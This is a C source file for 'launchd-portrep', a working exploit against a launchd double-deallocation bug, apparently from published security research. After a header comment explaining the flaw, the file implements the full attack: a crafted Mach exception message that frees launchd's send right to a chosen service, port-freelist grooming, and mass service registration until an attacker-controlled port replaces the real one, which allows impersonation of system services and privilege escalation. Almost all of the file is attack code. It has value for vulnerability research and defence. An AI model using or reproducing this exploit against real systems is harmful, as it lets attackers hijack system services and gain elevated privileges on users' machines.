/*
 * launchd-portrep
 * Brandon Azad
 *
 *
 * launchd-portrep
 * ================================================================================================
 *
 *  launchd-portrep is an exploit for a port replacement vulnerability in launchd. By sending a
 *  crafted Mach message to the bootstrap port, launchd can be coerced into deallocating its send
 *  right for any Mach port to which the attacker also has a send right. This allows the attacker
 *  to impersonate any launchd service it can look up to the rest of the system.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  Launchd multiplexes multiple different Mach message handlers over its main port, including a
 *  MIG handler for exception messages. If a process sends a mach_exception_raise,
 *  mach_exception_raise_state, or mach_exception_raise_state_identity message to its bootstrap
 *  port, launchd will receive and process that message as a host-level exception.
 *
 *  Unfortunately, launchd's handling of these messages is buggy. If the exception type is 10
 *  (EXC_CRASH), then launchd will deallocate the thread and task ports sent in the message and
 *  then return 5 (KERN_FAILURE) from the service routine, causing the MIG system to deallocate the
 *  thread and task ports again. (The assumption is that if a service routine returns success, then
 *  the service routine has taken ownership of all resources in the Mach message, while if the
 *  service routine returns an error, then the service routine has taken ownership of none of the
 *  resources.)
 *
 *  This can be exploited to free launchd's send right to any Mach port to which the attacking
 *  process also has a send right. In particular, if the attacker can look up a system service
 *  using launchd, then it can free launchd's send right to that service and then impersonate it to
 *  the rest of the system. After that there are many different routes to gain system privileges.
 *
 */

#include "launchd-portrep.h"

#include <assert.h>
#include <bootstrap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// ---- Logging -----------------------------------------------------------------------------------

#define DEBUG_LEVEL(level)	(DEBUG && level <= DEBUG)

#if DEBUG
#define DEBUG_TRACE(level, fmt, ...)						\
	do {									\
		if (DEBUG_LEVEL(level)) {					\
			log_internal('D', fmt, ##__VA_ARGS__);			\
		}								\
	} while (0)
#else
#define DEBUG_TRACE(level, fmt, ...)	do {} while (0)
#endif
#define INFO(fmt, ...)			log_internal('I', fmt, ##__VA_ARGS__)
#define WARNING(fmt, ...)		log_internal('W', fmt, ##__VA_ARGS__)
#define ERROR(fmt, ...)			log_internal('E', fmt, ##__VA_ARGS__)

// A function to call the logging implementation.
static void
log_internal(char type, const char *format, ...) {
	if (launchd_portrep_log != NULL) {
		va_list ap;
		va_start(ap, format);
		launchd_portrep_log(type, format, ap);
		va_end(ap);
	}
}

// The default logging implementation simply prints to stderr.
static void
log_to_stderr(char type, const char *format, va_list ap) {
	char *message = NULL;
	vasprintf(&message, format, ap);
	assert(message != NULL);
	const char *logtype   = "";
	const char *separator = ": ";
	switch (type) {
		case 'D': logtype = "Debug";   break;
		case 'I': logtype = "Info";    break;
		case 'W': logtype = "Warning"; break;
		case 'E': logtype = "Error";   break;
		default:  separator = "";
	}
	fprintf(stderr, "%s%s%s\n", logtype, separator, message);
	free(message);
}

void (*launchd_portrep_log)(char type, const char *format, va_list ap) = log_to_stderr;

// ---- Freeing a Mach send right in launchd ------------------------------------------------------

bool
launchd_release_send_right_twice(mach_port_t send_right) {
	// We will send a Mach message to launchd that triggers the
	// mach_exception_raise_state_identity MIG handler in launchd. This MIG handler, which is
	// exposed over the bootstrap port, improperly calls mach_port_deallocate() on the supplied
	// task and thread ports, even when returning an error condition due to supplying exception
	// 10. This leads to a double-deallocate of those ports.
	const mach_port_t reply_port = mig_get_reply_port();
	const uint32_t deallocate_ports_exception = 10; // EXC_CRASH
	const mach_msg_id_t mach_exception_raise_state_identity_id = 2407;
	const kern_return_t RetCode_success = 5; // KERN_FAILURE
	const int32_t flavor = 6; // ARM_THREAD_STATE64
	const uint32_t stateCnt = 144;

	// The request message structure.
	typedef struct __attribute__((packed)) {
		mach_msg_header_t          hdr;
		mach_msg_body_t            body;
		mach_msg_port_descriptor_t thread;
		mach_msg_port_descriptor_t task;
		NDR_record_t               NDR;
		uint32_t                   exception;
		uint32_t                   codeCnt;
		int64_t                    code[2];
		int32_t                    flavor;
		uint32_t                   old_stateCnt;
		uint32_t                   old_state[stateCnt];
	} Request;

	// The reply message structure.
	typedef struct __attribute__((packed)) {
		mach_msg_header_t      hdr;
		NDR_record_t           NDR;
		kern_return_t          RetCode;
		int32_t                flavor;
		mach_msg_type_number_t new_stateCnt;
		uint32_t               new_state[stateCnt];
		mach_msg_trailer_t     trailer;
	} Reply;

	// Create a buffer to hold the messages.
	typedef union {
		Request in;
		Reply   out;
	} Message;
	Message msg = {};

	// Populate the message.
	msg.in.hdr.msgh_bits              = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, MACH_MSGH_BITS_COMPLEX);
	msg.in.hdr.msgh_size              = sizeof(msg);
	msg.in.hdr.msgh_remote_port       = bootstrap_port;
	msg.in.hdr.msgh_local_port        = reply_port;
	msg.in.hdr.msgh_id                = mach_exception_raise_state_identity_id;
	msg.in.body.msgh_descriptor_count = 2;
	msg.in.thread.name                = send_right;
	msg.in.thread.disposition         = MACH_MSG_TYPE_COPY_SEND;
	msg.in.thread.type                = MACH_MSG_PORT_DESCRIPTOR;
	msg.in.task.name                  = send_right;
	msg.in.task.disposition           = MACH_MSG_TYPE_COPY_SEND;
	msg.in.task.type                  = MACH_MSG_PORT_DESCRIPTOR;
	msg.in.exception                  = deallocate_ports_exception;
	msg.in.codeCnt                    = 2;
	msg.in.code[0]                    = 0;
	msg.in.code[1]                    = 0;
	msg.in.flavor                     = flavor;
	msg.in.old_stateCnt               = stateCnt;

	// Send the message to launchd. This will cause two of launchd's urefs on send_right to be
	// released. Also, silence the "taking address of packed member" warning since it's
	// incorrect here.
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Waddress-of-packed-member"
	kern_return_t kr = mach_msg(&msg.in.hdr,
			MACH_SEND_MSG | MACH_RCV_MSG,
			msg.in.hdr.msgh_size,
			sizeof(msg.out),
			reply_port,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
#pragma clang diagnostic pop
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "mach_msg", kr);
		return false;
	}

	// Check that the reply message suggests we're on the right track. Note that we can't check
	// that launchd's uref count on the port has been successfully decremented; we can only
	// check that we're executing the right code path in launchd. Thus, when the bug is
	// patched, this will still return true.
	if (msg.out.hdr.msgh_id != mach_exception_raise_state_identity_id + 100) {
		ERROR("Unexpected message ID %x", msg.out.hdr.msgh_id);
		return false;
	}
	if (msg.out.RetCode != RetCode_success) {
		ERROR("Unexpected RetCode %x", msg.out.RetCode);
		return false;
	}
	return true;
}

// ---- Replacing a service port in launchd -------------------------------------------------------

// Look up the specified service in launchd, returning the service port.
static mach_port_t
launchd_look_up(const char *service) {
	mach_port_t service_port = MACH_PORT_NULL;
	kern_return_t kr = bootstrap_look_up(bootstrap_port, service, &service_port);
	if (service_port == MACH_PORT_NULL) {
		ERROR("%s(%s): %x", "bootstrap_look_up", service, kr);
	}
	return service_port;
}

// Generate a list of ports that can be given to reverse_mach_port_freelist_send_ports() to reverse
// the top of a task's Mach port freelist. This list can be passed to either
// reverse_mach_port_freelist_destroy_ports() or reverse_mach_port_freelist_send_ports() (but not
// both).
static mach_port_t *
reverse_mach_port_freelist_generate_ports(size_t count) {
	mach_port_t *ports = malloc(count * sizeof(*ports));
	assert(ports != NULL);
	for (size_t i = 0; i < count; i++) {
		kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
				&ports[i]);
		assert(kr == KERN_SUCCESS);
		kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i],
				MACH_MSG_TYPE_MAKE_SEND);
		assert(kr == KERN_SUCCESS);
	}
	return ports;
}

// Destroy the ports generated by reverse_mach_port_freelist_generate_ports().
static void
reverse_mach_port_freelist_destroy_ports(mach_port_t *ports, size_t count) {
	for (size_t i = 0; i < count; i++) {
		mach_port_destroy(mach_task_self(), ports[i]);
	}
	free(ports);
}

// Try to send the freelist-reversing message to the service.
static bool
reverse_mach_port_freelist_send_ports(mach_port_t service, mach_port_t *ports, size_t count) {
	// Our request message will just contain OOL ports.
	typedef struct __attribute__((packed)) {
		mach_msg_header_t               hdr;
		mach_msg_body_t                 body;
		mach_msg_ool_ports_descriptor_t ool_ports;
	} Request;
	// Build the request message.
	Request msg = {};
	msg.hdr.msgh_bits              = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
	msg.hdr.msgh_size              = sizeof(msg);
	msg.hdr.msgh_remote_port       = service;
	msg.hdr.msgh_id                = 0x10000000;
	msg.body.msgh_descriptor_count = 1;
	msg.ool_ports.address          = ports;
	msg.ool_ports.count            = count;
	msg.ool_ports.deallocate       = 0;
	msg.ool_ports.disposition      = MACH_MSG_TYPE_MAKE_SEND;
	msg.ool_ports.type             = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	// Send the message.
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Waddress-of-packed-member"
	kern_return_t kr = mach_msg(&msg.hdr,
			MACH_SEND_MSG,
			msg.hdr.msgh_size,
			0,
			MACH_PORT_NULL,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	// Deallocate the ports.
	reverse_mach_port_freelist_destroy_ports(ports, count);
	// Check whether everything worked.
	if (kr != KERN_SUCCESS) {
		WARNING("%s: %x", "mach_msg", kr);
		return false;
	}
	return true;
}

bool
launchd_replace_service_port(const char *service_name,
		mach_port_t *real_service_port, mach_port_t *replacement_service_port) {
	// Using the double-deallocate primitive above, we can cause launchd to deallocate its send
	// right to one of the services that it vends (so long as we are allowed to look up that
	// service). Then, by registering a large number of services, we can eventually get that
	// Mach port name to be reused for one of our services. From that point on, when other
	// programs look up the target service in launchd, launchd will send a send right to our
	// fake service rather than the real one.
	const size_t MAX_TRIES  = 2000;
	const size_t PORT_COUNT = 400;
	// Look up the service.
	mach_port_t real_service = launchd_look_up(service_name);
	if (real_service == MACH_PORT_NULL) {
		return false;
	}
	DEBUG_TRACE(1, "%s: %s = %x", __func__, service_name, real_service);
	// Generate ports to reverse the first PORT_COUNT / 2 entries of the port freelist.
	mach_port_t *free_ports = reverse_mach_port_freelist_generate_ports(PORT_COUNT / 2);
	// Release launchd's send right to the powerd service.
	bool ok = launchd_release_send_right_twice(real_service);
	if (!ok) {
		return false;
	}
	// Try to bury the just-freed port in the freelist.
	reverse_mach_port_freelist_send_ports(bootstrap_port, free_ports, PORT_COUNT / 2);
#if DEBUG
	// Make sure that launchd actually freed the port. We disable this check on non-debug
	// builds so that it's less likely the port gets reallocated.
	mach_port_t freed_service = launchd_look_up(service_name);
	if (freed_service == real_service && MACH_PORT_VALID(real_service)) {
		ERROR("Could not free launchd service port for %s", service_name);
		return false;
	}
#endif
	// Allocate an array to store our ports.
	mach_port_t replacement_port = MACH_PORT_NULL;
	mach_port_t *ports = malloc(PORT_COUNT * sizeof(*ports));
	assert(ports != NULL);
	// Try a number of times to replace the freed port. It would be better if we could
	// reliably wrap around the port, but it seems like that's not working for some reason.
	ok = true;
	for (size_t try = 0; ok && replacement_port == MACH_PORT_NULL;) {
		// Allocate a bunch of ports that we will register with launchd.
		for (size_t i = 0; i < PORT_COUNT; i++) {
			kern_return_t kr = mach_port_allocate(mach_task_self(),
					MACH_PORT_RIGHT_RECEIVE, &ports[i]);
			assert(kr == KERN_SUCCESS);
			kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i],
					MACH_MSG_TYPE_MAKE_SEND);
			assert(kr == KERN_SUCCESS);
		}
		// Register services for each port.
		for (size_t i = 0; i < PORT_COUNT; i++) {
			char service_name[64];
			snprintf(service_name, sizeof(service_name), "launchd.replace.%zu", i);
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
			kern_return_t kr = bootstrap_register(bootstrap_port, service_name,
					ports[i]);
#pragma clang diagnostic pop
			if (kr != KERN_SUCCESS) {
				ERROR("Could not register %s: %x\n", service_name, kr);
				ok = false;
				goto deallocate_ports;
			}
		}
		// Now look up the service again and see if it's one of our ports.
		mach_port_t new_service = launchd_look_up(service_name);
		for (size_t i = 0; i < PORT_COUNT; i++) {
			if (new_service == ports[i]) {
				DEBUG_TRACE(1, "Replaced %s with replacer port %zu after %zu %s",
						service_name, i, try,
						(try == 1 ? "try" : "tries"));
				replacement_port = ports[i];
				break;
			}
		}
#if DEBUG
		// Check if we got something else entirely. This used to happen regularly, but now
		// that we're pushing the freed port down the freelist it's not as common.
		if (new_service != MACH_PORT_DEAD && replacement_port == MACH_PORT_NULL) {
			DEBUG_TRACE(1, "%s: Got something unexpected! %x", __func__, new_service);
		}
#endif
deallocate_ports:
		// Destroy the ports, which should unregister the services with launchd.
		for (size_t i = 0; i < PORT_COUNT; i++) {
			if (ports[i] != replacement_port) {
				mach_port_destroy(mach_task_self(), ports[i]);
			}
		}
		// Increment our try count.
		if (ok) {
			try++;
			if (try >= MAX_TRIES) {
				ERROR("Could not replace launchd's service port "
						"for %s after %zu %s", service_name, try,
						(try == 1 ? "try" : "tries"));
				ok = false;
			}
		}
	}
	// Clean up the ports array.
	free(ports);
	// If we failed, bail.
	if (!ok) {
		return false;
	}
	// Set the output ports and return success.
	*real_service_port        = real_service;
	*replacement_service_port = replacement_port;
	return true;
}
